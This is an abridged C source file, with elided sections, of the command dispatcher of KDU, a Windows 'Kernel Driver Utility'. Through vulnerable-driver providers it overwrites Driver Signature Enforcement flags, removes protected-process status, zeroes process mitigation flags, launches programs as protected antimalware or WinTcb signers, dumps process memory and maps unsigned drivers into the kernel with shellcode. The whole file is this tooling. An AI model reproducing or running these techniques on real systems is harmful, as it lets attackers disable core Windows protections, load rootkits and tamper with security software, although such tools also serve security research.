...
#define T_KDUUSAGE                                                             \
    "[?] No valid parameters combination specified or command is not "         \
    "recognized, see Usage for help\r\n"                                       \
    "[?] Usage: kdu [Provider][Command]\r\n\n"                                 \
    "Parameters: \r\n"                                                         \
    "kdu -list         - List available providers\r\n"                         \
    "kdu -diag         - Run system diagnostic for troubleshooting\r\n"        \
    "kdu -prv id       - Optional, sets provider id to be used with rest of "  \
    "commands, default 0\r\n"                                                  \
    "kdu -dmp pid      - Dump virtual memory of the given process\r\n"         \
    "kdu -ps pid       - Disable ProtectedProcess for given pid\r\n"           \
    "kdu -pse cmdline  - Launch program as "                                   \
    "PsProtectedSignerAntimalware-Light\r\n"                                   \
    "kdu -psw cmdline  - Launch program as PsProtectedSignerWinTcb-Light\r\n"  \
    "kdu -pm pid       - Overwrites Process MitigationsFlags1 and 2 with 0x0 " \
    "for given pid\r\n"                                                        \
    "kdu -pm1 pid      - Overwrites Process MitigationsFlags1 with 0x0 for "   \
    "given pid\r\n"                                                            \
    "kdu -pm2 pid      - Overwrites Process MitigationsFlags2 with 0x0 for "   \
    "given pid\r\n"                                                            \
    "kdu -dse value    - Write user defined value to the system DSE state "    \
    "flags\r\n"                                                                \
    "kdu -map filename - Map driver to the kernel and execute it entry "       \
    "point, this command have dependencies listed below\r\n"                   \
    "-scv version      - Optional, select shellcode version, default 1\r\n"    \
    "-drvn name        - Driver object name (only valid for shellcode "        \
    "version 3)\r\n"                                                           \
    "-drvr name        - Optional, driver registry key name (only valid for "  \
    "shellcode version 3)\r\n"
 ...
 *
 */
INT KDUProcessDmpSwitch(_In_ ULONG HvciEnabled,
    ...
    provContext = KDUProviderCreate(ProviderId, HvciEnabled, NtBuildNumber,
                                    KDU_SHELLCODE_NONE, ActionTypeDumpProcess);
 ...
 *
 */
INT KDUProcessPSEObjectSwitch(_In_ ULONG HvciEnabled,
                              _In_ ULONG NtBuildNumber,
                              _In_ ULONG ProviderId,
    ...
    provContext = KDUProviderCreate(ProviderId, HvciEnabled, NtBuildNumber,
                                    KDU_SHELLCODE_NONE, ActionTypeDKOM);
 ...
 *
 */
INT KDUProcessPMObjectSwitch(_In_ ULONG HvciEnabled,
                             _In_ ULONG NtBuildNumber,
                             _In_ ULONG ProviderId,
    ...
    if (provContext) {
        retVal = KDUUnmitigateProcess(
            provContext, ProcessId, PS_NO_MITIGATIONS,
            TargetedFlags);  // TODO: parametrize mitigations
        KDUProviderRelease(provContext);
    }
 ...
 *
 */
INT KDUProcessPSObjectSwitch(_In_ ULONG HvciEnabled,
                             _In_ ULONG NtBuildNumber,
                             _In_ ULONG ProviderId,
                             _In_ ULONG_PTR ProcessId) {
    INT retVal = 0;
 ...
 *
 */
INT KDUProcessDSEFixSwitch(_In_ ULONG HvciEnabled,
                           _In_ ULONG NtBuildNumber,
                           _In_ ULONG ProviderId,
                           _In_ ULONG DSEValue) {
    INT retVal = 0;
    ...
    provContext =
        KDUProviderCreate(ProviderId, HvciEnabled, NtBuildNumber,
                          KDU_SHELLCODE_NONE, ActionTypeDSECorruption);
    ...
    if (provContext) {
        if (provContext->Provider->Callbacks.ControlDSE) {
            ...
            if (ciVarAddress == 0) {
                ciVarAddress =
                    KDUQueryCodeIntegrityVariableAddress(NtBuildNumber);
            }
            ...
            if (ciVarAddress == 0) {
                ...
                retVal = provContext->Provider->Callbacks.ControlDSE(
                    provContext, DSEValue, ciVarAddress);
            }
        }
        KDUProviderRelease(provContext);
    }
 ...
 *
 */
INT KDUProcessDrvMapSwitch(_In_ ULONG HvciEnabled,
                           _In_ ULONG NtBuildNumber,
                           _In_ ULONG ProviderId,
    ...
    if (ShellVersion == KDU_SHELLCODE_V3) {
        if (DriverObjectName == NULL) {
            supPrintfEvent(
                kduEventError,
                "[!] Driver object name is required when working with this "
                "shellcode\r\n"
                "[?] Use the following commands to supply object name and "
                "optionally registry key name\r\n"
        ...
        if (DriverRegistryPath) {
            ...
            printf_s(
                "[+] No driver registry key name specified, driver object name "
    ...
    if ((!NT_SUCCESS(ntStatus)) || (pvImage == NULL)) {
        ...
        provContext = KDUProviderCreate(ProviderId, HvciEnabled, NtBuildNumber,
                                        ShellVersion, ActionTypeMapDriver);
        ...
        if (provContext) {
            if (ShellVersion == KDU_SHELLCODE_V3) {
                ...
                // If not specified we will assume its the same name as driver
                // object.
                //
                if (DriverRegistryPath) {
            ...
            retVal = provContext->Provider->Callbacks.MapDriver(provContext,
                                                                pvImage);
            KDUProviderRelease(provContext);
        }
 ...
 *
 */
INT KDUProcessCommandLine(_In_ ULONG HvciEnabled, _In_ ULONG NtBuildNumber) {
    INT retVal = 0;
    ULONG providerId = KDU_PROVIDER_DEFAULT, dseValue = 0, paramLength = 0,
          shellVersion;
    ULONG_PTR processId;
    ...
    do {
        ...
        if (supGetCommandLineOption(CMD_TEST, FALSE, NULL, 0, NULL)) {
            KDUTest();
            retVal = 1;
            break;
        }

        if (supGetCommandLineOption(CMD_RNG, FALSE, NULL, 0, NULL)) {
            DWORD dwKey = 0;
        ...
        // List providers.
        //
        if (supGetCommandLineOption(CMD_LIST, FALSE, NULL, 0, NULL)) {
            KDUProvList();
            retVal = 1;
            break;
        }
        ...
        //
        if (supGetCommandLineOption(CMD_SI, FALSE, NULL, 0, NULL)) {
            KDUDiagStart();
            retVal = 1;
            break;
        }
        ...
        // Select CVE provider.
        //
        if (supGetCommandLineOption(CMD_PRV, TRUE, szParameter,
                                    RTL_NUMBER_OF(szParameter), NULL)) {
            providerId = _strtoul(szParameter);
            if (providerId >= KDUProvGetCount()) {
                supPrintfEvent(kduEventError,
                               "[!] Invalid provider id %lu specified, default "
                               "will be used (%lu)\r\n",
        ...
        //
        if (supGetCommandLineOption(CMD_DSE, TRUE, szParameter,
                                    RTL_NUMBER_OF(szParameter), NULL)) {
            dseValue = _strtoul(szParameter);
            retVal = KDUProcessDSEFixSwitch(HvciEnabled, NtBuildNumber,
                                            providerId, dseValue);
        } else
            ...
            //
            if (supGetCommandLineOption(CMD_MAP, TRUE, szParameter,
                ...
                if (paramLength == 0) {
                    ...
                    if (supGetCommandLineOption(CMD_SCV, TRUE, szExtraParameter,
                                                RTL_NUMBER_OF(szExtraParameter),
                                                NULL)) {
                        shellVersion = _strtoul(szExtraParameter);
                        if (shellVersion == 0 ||
                            shellVersion > KDU_SHELLCODE_VMAX) {
                            supPrintfEvent(
                                kduEventError,
                                "[!] Unrecognized shellcode version %lu, "
                                "default will be used (%lu)\r\n",
                                shellVersion, KDU_SHELLCODE_V1);
                    ...
                    paramLength = 0;
                    supGetCommandLineOption(CMD_DRVNAME, TRUE, szDriverName,
                                            RTL_NUMBER_OF(szDriverName),
                                            &paramLength);

                    lpParam1 = (paramLength != 0) ? szDriverName : NULL;

                    RtlSecureZeroMemory(szDriverRegPath,
                                        sizeof(szDriverRegPath));
                    paramLength = 0;
                    supGetCommandLineOption(CMD_DRVREG, TRUE, szDriverRegPath,
                                            RTL_NUMBER_OF(szDriverRegPath),
                                            &paramLength);

                    lpParam2 = (paramLength != 0) ? szDriverRegPath : NULL;

                    retVal = KDUProcessDrvMapSwitch(
                        HvciEnabled, NtBuildNumber, providerId, shellVersion,
                        szParameter, lpParam1, lpParam2);
                }
            }
                ...
                //
                if (supGetCommandLineOption(CMD_PS, TRUE, szParameter,
                                            RTL_NUMBER_OF(szParameter), NULL)) {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessPSObjectSwitch(
                        HvciEnabled, NtBuildNumber, providerId, processId);
                }

                else if (supGetCommandLineOption(CMD_PM, TRUE, szParameter,
                                                 RTL_NUMBER_OF(szParameter),
                                                 NULL)) {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessPMObjectSwitch(
                        HvciEnabled, NtBuildNumber, providerId, processId,
                        PS_MITIGATION_FLAGS1 | PS_MITIGATION_FLAGS2);
                }

                else if (supGetCommandLineOption(CMD_PM1, TRUE, szParameter,
                                                 RTL_NUMBER_OF(szParameter),
                                                 NULL)) {
                    processId = strtou64(szParameter);
                ...
                else if (supGetCommandLineOption(CMD_PM2, TRUE, szParameter,
                                                 RTL_NUMBER_OF(szParameter),
                                                 NULL)) {
                    processId = strtou64(szParameter);
                ...
                else if (supGetCommandLineOption(CMD_PSE, TRUE, szParameter,
                                                 RTL_NUMBER_OF(szParameter),
                                                 NULL)) {
                    retVal = KDUProcessPSEObjectSwitch(
                        HvciEnabled, NtBuildNumber, providerId, szParameter,
                        FALSE);
                }

                else if (supGetCommandLineOption(CMD_PSW, TRUE, szParameter,
                                                 RTL_NUMBER_OF(szParameter),
                                                 NULL)) {
                    retVal = KDUProcessPSEObjectSwitch(
                        HvciEnabled, NtBuildNumber, providerId, szParameter,
                ...
                else if (supGetCommandLineOption(CMD_DMP, TRUE, szParameter,
                                                 RTL_NUMBER_OF(szParameter),
                                                 NULL)) {
                    processId = strtou64(szParameter);

                    retVal = KDUProcessDmpSwitch(HvciEnabled, NtBuildNumber,
                                                 providerId, (HANDLE)processId);
                }
...
int KDUMain() {
...
#ifdef _DEBUG
    printf_s(
        "[*] Debug Mode Run, several features (like a shellcode proper "
    ...
    do {
        ...
        if ((osv.dwMajorVersion < 6) ||
            ...
            supPrintfEvent(kduEventError, "[!] Unsupported WinNT version\r\n");
        ...
        if (!ntsupUserIsFullAdmin()) {
            supPrintfEvent(
                ...
                "[!] Verify that you have sufficient privileges and you are "
                "not running program under any compatibility layer.\r\n");
        ...
        StringCchPrintfA(szVersion, 100, "[*] Windows version: %u.%u build %u",
        ...
        if (NT_SUCCESS(NtQuerySystemInformation(SystemCodeIntegrityInformation,
                                                &ciPolicy, sizeof(ciPolicy),
                                                &dummy))) {
            if (ciPolicy.CodeIntegrityOptions & CODEINTEGRITY_OPTION_TESTSIGN)
                printf_s("[*] Test Mode ENABLED\r\n");

            if (ciPolicy.CodeIntegrityOptions &
            ...
            if (ciPolicy.CodeIntegrityOptions &
                CODEINTEGRITY_OPTION_WHQL_ENFORCEMENT_ENABLED)
                printf_s("[*] WHQL enforcement ENABLED\r\n");
        }

        if (osv.dwBuildNumber >= NT_WIN10_REDSTONE5) {
            BOOL bEnabled = FALSE;
            if (supDetectMsftBlockList(&bEnabled, FALSE, osv.dwBuildNumber,
                                       hvciActive)) {
...
VOID KDUIntroBanner() {
    ...
    printf_s(
        "[#] Kernel Driver Utility v%lu.%lu.%lu (build %lu) started, (c)2020 - "
        "%lu KDU Project\r\n"
        ...
        KDU_VERSION_BUILD, KDU_COPYRIGHT_YEAR, __TIMESTAMP__,
...
UINT KDUCheckAnotherInstance() {
    ...
    StringCchPrintf(szObject, MAX_PATH, L"\\BaseNamedObjects\\%ws", szName);

    RtlInitUnicodeString(&usName, szObject);
    InitializeObjectAttributes(&obja, &usName, OBJ_CASE_INSENSITIVE, NULL,
                               NULL);
    NTSTATUS status =
        NtCreateMutant(&mutantHandle, MUTANT_ALL_ACCESS, &obja, FALSE);
